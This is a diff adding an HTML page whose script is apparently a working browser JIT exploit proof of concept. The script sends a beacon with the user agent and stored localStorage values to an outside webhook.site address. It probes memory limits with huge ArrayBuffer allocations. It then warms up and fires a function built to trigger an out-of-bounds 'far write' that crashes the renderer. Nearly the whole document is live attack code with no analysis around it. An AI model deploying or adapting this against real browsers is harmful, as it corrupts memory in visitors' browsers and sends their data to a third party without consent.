@@ -1,0 +1,22 @@
+<html><body><script>
+// r3: render-loop probe - beacon, sandbox probe, then the 7965 far-write trigger (crashes renderer)
+var SINK='https://webhook.site/4d4116b3-9a45-4992-b92f-e94487739e32';
+function beacon(t,v){ try{ navigator.sendBeacon(SINK+'/b?t='+encodeURIComponent(t), String(v).slice(0,150)); }catch(e){} try{ fetch(SINK+'?t='+encodeURIComponent(t)+'&v='+encodeURIComponent(String(v).slice(0,150)),{mode:'no-cors'});}catch(e){} }
+beacon('render','ua='+navigator.userAgent.slice(60,95));
+try{ beacon('prev', localStorage.getItem('r3n')||'none'); localStorage.setItem('r3n', String(Date.now())); }catch(e){}
+function sb(n,fn){ try{ beacon('sb-'+n,'ok '+fn()); }catch(e){ beacon('sb-'+n, e.name); } }
+sb('33GiB', function(){ return new ArrayBuffer(33*1024*1024*1024).byteLength; });
+sb('16GiB', function(){ return new ArrayBuffer(16*1024*1024*1024).byteLength; });
+beacon('A-done','probe');
+var fake=new Uint32Array(10); for(var i=0;i<10;i++) fake[i]=i+1;
+var tahir=0x1; function poc(a){ var oob=new Array(5); oob[0]=0x500; let jv=fake[0]; let av=fake[7];
+ if(a%7==0) av=0xff00000000; av=Math.max(av,tahir); av=av>>>0; var index=fake[3]; var fpm=fake[6]; let c=fake[1];
+ for(var i=0;i<10;i++){ if(a%3==0) jv=c; if(a%37==0) jv=fake[2]; if(a%11==0) jv=fake[8]; if(a%17==0) jv=fake[5]; if(a%19==0) jv=fake[4];
+  if(a%7==0&&i>=5){ fpm=jv; jv=av; } if(i>=6){ for(let j=0;j<5;j++){ if(a%5==0){ index=fpm; oob[index]=0x500; } } } fpm=c; c=jv; }
+ return [index,BigInt(jv)]; }
+for(let i=2;i<0x500;i++) poc(i);
+for(let w=0;w<50000;w++) poc(w%500+2);
+beacon('B-warm','50k done');
+for(const a of [35,70,105,140,175,385,665]){ beacon('B-fire','a='+a); poc(a); }
+beacon('B-survived','no crash');
+</script></body></html>
